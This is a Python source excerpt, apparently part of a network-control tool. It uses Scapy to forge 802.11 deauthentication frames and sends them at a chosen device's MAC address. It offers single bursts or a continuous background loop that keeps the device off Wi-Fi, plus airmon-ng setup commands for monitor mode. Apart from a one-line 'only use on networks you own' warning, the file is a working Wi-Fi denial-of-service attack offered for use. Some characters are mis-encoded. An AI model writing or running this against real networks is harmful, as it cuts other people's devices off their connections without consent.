def deauth_target(target_mac, ap_mac, mon_iface, count=200):
    pkt = (RadioTap() /
           Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) /
           Dot11Deauth(reason=7))
    sendp(pkt, iface=mon_iface, count=count, inter=0.05, verbose=False)


def _deauth_loop(target_mac, ap_mac, mon_iface, interval, stop_ev):
    """Continuous deauth вЂ” sends bursts every `interval` seconds until stopped."""
    while not stop_ev.is_set():
        try:
            deauth_target(target_mac, ap_mac, mon_iface, count=64)
        except Exception:
            pass
        time.sleep(interval)


def menu_deauth():
    console.print(Panel(
        "[yellow]Deauth requires a second USB WiFi adapter in [bold]monitor mode[/bold].\n\n"
        "[cyan]Setup commands:[/]\n"
        "  sudo airmon-ng check kill\n"
        "  sudo airmon-ng start wlan1\n"
        "  в†’ creates interface [bold]wlan1mon[/bold]\n\n"
        "[red]вљ   Only use on networks you own or manage.[/red]",
        title="[bold red]Deauth вЂ” Monitor Mode Required[/]",
        border_style="red"))

    mon_iface  = Prompt.ask("[cyan]Monitor interface (e.g. wlan1mon)[/]")
    target_mac = Prompt.ask("[cyan]Target MAC[/]")
    ap_mac     = GATEWAY_MAC or Prompt.ask("[cyan]AP/Gateway MAC[/]")
    count      = int(Prompt.ask("[cyan]Packet count (single burst)[/]", default="200"))
    continuous = Confirm.ask("[yellow]Enable continuous deauth loop?[/]", default=False)

    if not Confirm.ask(f"[red]Deauth [bold]{target_mac}[/bold] via {mon_iface}?[/]"):
        return

    if continuous:
        interval = float(Prompt.ask("[cyan]Burst interval (seconds)[/]", default="3"))
        stop_key = f"deauth_{target_mac}"
        if stop_key in _stop_events:
            console.print("[yellow]Already running for this target.[/]")
        else:
            ev = threading.Event()
            _stop_events[stop_key] = ev
            t  = threading.Thread(
                target=_deauth_loop,
                args=(target_mac, ap_mac, mon_iface, interval, ev),
                daemon=True
            )
            t.start()
            JAILED[target_mac.lower()] = {
                "ip": "вЂ”", "reason": "Continuous deauth",
                "time": datetime.now().strftime("%H:%M:%S")
            }
